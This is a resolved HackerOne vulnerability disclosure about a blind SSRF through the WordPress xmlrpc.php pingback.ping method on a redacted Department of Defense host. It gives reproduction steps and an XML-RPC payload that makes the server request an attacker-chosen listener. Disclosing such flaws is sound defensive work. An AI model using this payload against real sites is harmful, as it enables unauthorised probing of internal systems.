---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
  - stack/php
  - vuln/ssrf
  - fix/input-validation
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2023-04-14
submitted: 2023-03-03T01:43:41.980Z
bounty_usd: null
votes: 28
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "0r10nh4ck"
source: "https://hackerone.com/reports/1890719"
title: "Unauthenticated Blind SSRF at https://█████ via xmlrpc.php file"
---
# Unauthenticated Blind SSRF at https://█████ via xmlrpc.php file

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 28 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2023-04-14

- Report: [https://hackerone.com/reports/1890719](https://hackerone.com/reports/1890719)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2023-03-03T01:43:41.980Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**

Hi team,

I would like to report a security vulnerability I discovered on your website. I was able to perform Server-Side Request Forgery (SSRF) attacks via the xmlrpc.php file at https://████████ endpoint.
Using a simple POST request to the xmlrpc.php endpoint, I was able to bypass input validation and send a request to an external URL.

I have attached a proof of concept (PoC) script that demonstrates this vulnerability. It sends a request to my VPS server using interact.sh client (https://github.com/projectdiscovery/interactsh), but an attacker could use this technique to send requests to any URL of their choosing.

## References

https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/
https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

## Impact

The vulnerability could be used to conduct further attacks, such as accessing internal systems or exfiltrating sensitive data.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Start a server in vps using interact.sh or use burpsuite collaborator.
2. Go to: https://███/xmlrpc.php
3. See the response:
```
XML-RPC server accepts POST requests only.
```
4. Go to burpsuite and send this request to the repeater.
5. Change the request method to POST.
6. Get the URL of your server listener and set this payload at request:
```
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://your server</string></value>
</param>
<param>
<value><string>https://█████/</string></value>
</param>
</params>
</methodCall>
```
7. Send the POST request.
8. See the response in your server log.

## Suggested Mitigation/Remediation Actions
I would recommend implementing input validation and filtering to prevent these types of attacks in the future. Please let me know if you require any additional information or if you have any questions.

## Timeline

- **Report Filed**
- **2023-03-03** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
